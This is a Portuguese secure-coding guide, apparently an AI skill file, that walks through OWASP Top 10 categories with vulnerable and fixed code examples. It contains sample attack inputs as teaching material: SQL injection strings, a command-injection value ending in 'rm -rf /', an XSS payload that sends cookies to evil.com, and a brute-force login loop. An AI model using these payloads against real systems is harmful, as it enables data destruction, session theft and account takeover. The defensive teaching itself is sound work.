# owasp.md — SHIELD Sub-Skill: OWASP Top 10
# Ativa quando: "OWASP", "injection", "XSS", "CSRF", "top 10"

---

## OWASP Top 10 — 2021 (Referência Atual)

| Rank | Categoria | Risco no Contexto Wolf |
|------|-----------|----------------------|
| A01 | Broken Access Control | Alto — APIs de dados de clientes |
| A02 | Cryptographic Failures | Alto — dados de leads, pagamentos |
| A03 | Injection | Alto — qualquer input de usuário |
| A04 | Insecure Design | Médio — sistemas novos sem threat model |
| A05 | Security Misconfiguration | Alto — configs de deploy, CORS |
| A06 | Vulnerable Components | Médio — dependências desatualizadas |
| A07 | Auth & Identity Failures | Crítico — acesso a contas de cliente |
| A08 | Software Integrity Failures | Médio — pipelines de CI/CD |
| A09 | Logging & Monitoring Failures | Alto — sem detecção de ataques |
| A10 | SSRF | Médio — integração com APIs externas |

---

## A01 — Broken Access Control

**O que é:** Usuário acessa recursos que não deveria. O mais comum e impactante.

### Vulnerável
```typescript
// VULNERÁVEL: qualquer usuário autenticado vê qualquer relatório
app.get('/reports/:reportId', authenticate, async (req, res) => {
  const report = await db.reports.findById(req.params.reportId);
  res.json(report); // Não verifica se o report pertence ao usuário
});
```

### Seguro
```typescript
// SEGURO: verifica ownership antes de retornar
app.get('/reports/:reportId', authenticate, async (req, res) => {
  const report = await db.reports.findById(req.params.reportId);

  if (!report) {
    return res.status(404).json({ error: 'Not found' });
  }

  // Verifica se o relatório pertence à organização do usuário
  if (report.organizationId !== req.user.organizationId) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json(report);
});
```

### Teste Rápido
```bash
# Login como usuário A, pegar ID de um recurso
# Trocar para token do usuário B e tentar acessar o mesmo ID
curl -H "Authorization: Bearer TOKEN_USER_B" \
  https://api.exemplo.com/reports/REPORT_ID_FROM_USER_A
# Esperado: 403 Forbidden
# Vulnerável se: 200 OK com dados
```

---

## A03 — Injection (SQL, NoSQL, Command)

### SQL Injection
```typescript
// VULNERÁVEL
const query = `SELECT * FROM clients WHERE name = '${req.body.name}'`;
// Payload: ' OR '1'='1 — retorna todos os clientes

// SEGURO — prepared statements
const query = 'SELECT * FROM clients WHERE name = $1';
const result = await db.query(query, [req.body.name]);
```

```python
# VULNERÁVEL
query = f"SELECT * FROM campaigns WHERE client = '{client_name}'"

# SEGURO — parameterizado
query = "SELECT * FROM campaigns WHERE client = %s"
cursor.execute(query, (client_name,))
```

### Command Injection
```python
# VULNERÁVEL
import os
filename = request.form["filename"]
os.system(f"convert {filename} output.pdf")
# Payload: "file.png; rm -rf /"

# SEGURO — subprocess com lista (sem shell=True)
import subprocess
import re

if not re.match(r'^[\w\-]+\.(png|jpg|jpeg)$', filename):
    raise ValueError("Nome de arquivo inválido")

subprocess.run(["convert", filename, "output.pdf"], check=True)
```

### Teste Rápido
```bash
# SQL Injection básico em campo de busca
' OR '1'='1
' UNION SELECT null,username,password FROM users--
# Se retornar dados ou erro de SQL: vulnerável

# SQLMap automatizado (apenas em sistemas autorizados)
sqlmap -u "https://exemplo.com/search?q=test" --dbs
```

---

## A07 — Authentication & Identity Failures

**O que é:** Falhas em autenticação, gestão de sessão, força bruta.

### Problemas Comuns e Fixes

```typescript
// VULNERÁVEL: sem rate limiting em login
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body.email, req.body.password);
  // Permite infinitas tentativas

// SEGURO: rate limiting por IP + por conta
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutos
  max: 5,                      // 5 tentativas por IP
  message: 'Muitas tentativas. Tente novamente em 15 minutos.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/login', loginLimiter, async (req, res) => {
  // ...
});
```

```python
# VULNERÁVEL: comparação de senha com == (timing attack)
if user.password == provided_password:
    grant_access()

# SEGURO: hash + comparação segura
import bcrypt

def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode(), hashed.encode())
```

### Teste Rápido
```bash
# Brute force básico (apenas em sistemas autorizados)
for i in {1..10}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://exemplo.com/login \
    -d "email=admin@test.com&password=wrong$i"
done
# Se nunca retornar 429: sem rate limiting
```

---

## A05 — Security Misconfiguration

### Headers de Segurança HTTP

```typescript
// Express — helmet para todos os headers de uma vez
import helmet from 'helmet';

app.use(helmet());
// Adiciona automaticamente:
// X-Frame-Options: DENY
// X-Content-Type-Options: nosniff
// X-XSS-Protection: 1; mode=block
// Strict-Transport-Security: max-age=31536000
// Content-Security-Policy (configurar conforme necessário)

// CORS configurado corretamente
import cors from 'cors';

const allowedOrigins = [
  'https://app.wolfagency.com.br',
  'https://dashboard.wolfagency.com.br',
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Origem não permitida pelo CORS'));
    }
  },
  credentials: true,
}));
```

### Verificação de Headers
```bash
# Verificar headers de segurança de um endpoint
curl -I https://exemplo.com | grep -E "Strict-Transport|X-Frame|Content-Security|X-Content-Type"

# Ferramenta online
# https://securityheaders.com
```

---

## A02 — Cryptographic Failures

```python
# VULNERÁVEL: MD5 para senha (quebrável em segundos)
import hashlib
hashed = hashlib.md5(password.encode()).hexdigest()

# VULNERÁVEL: SHA1 sem salt
hashed = hashlib.sha1(password.encode()).hexdigest()

# SEGURO: bcrypt com fator de custo
import bcrypt

def hash_password(plain: str) -> str:
    return bcrypt.hashpw(plain.encode(), bcrypt.gensalt(rounds=12)).decode()

def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode(), hashed.encode())

# SEGURO: dados sensíveis em trânsito
# Sempre HTTPS. Nunca enviar credenciais em query string.
# URL: https://api.exemplo.com/auth?token=xxx (ERRADO — fica em logs)
# Header: Authorization: Bearer xxx (CORRETO)
```

---

## XSS — Cross-Site Scripting (parte do A03)

```typescript
// VULNERÁVEL: output sem escape
app.get('/search', (req, res) => {
  res.send(`<h1>Resultado para: ${req.query.q}</h1>`);
  // Payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
});

// SEGURO: usar template engine com auto-escape ou sanitizar
import DOMPurify from 'isomorphic-dompurify';

app.get('/search', (req, res) => {
  const safeQuery = DOMPurify.sanitize(req.query.q as string);
  res.json({ query: safeQuery }); // Melhor: retornar JSON, não HTML
});

// Content Security Policy como segunda linha de defesa
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],  // Sem 'unsafe-inline'
    styleSrc: ["'self'", "'unsafe-inline'"], // Apenas se necessário
    imgSrc: ["'self'", "data:", "https:"],
  },
}));
```

### Teste Rápido
```bash
# XSS básico em campos de input
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
# Se aparecer alerta: vulnerável
```

---

## Checklist de Teste Rápido por Categoria

| Categoria | Teste Básico | Tempo |
|-----------|-------------|-------|
| A01 | Trocar ID de recurso de outro usuário | 5 min |
| A03 | `' OR '1'='1` em campos de busca | 5 min |
| A05 | `curl -I` e verificar headers | 2 min |
| A07 | 10 tentativas de login → 429? | 3 min |
| XSS | `<script>alert(1)</script>` em inputs | 5 min |

Esses testes devem ser feitos em todo deploy novo. Não são substitutos de pentest, mas pegam o óbvio.
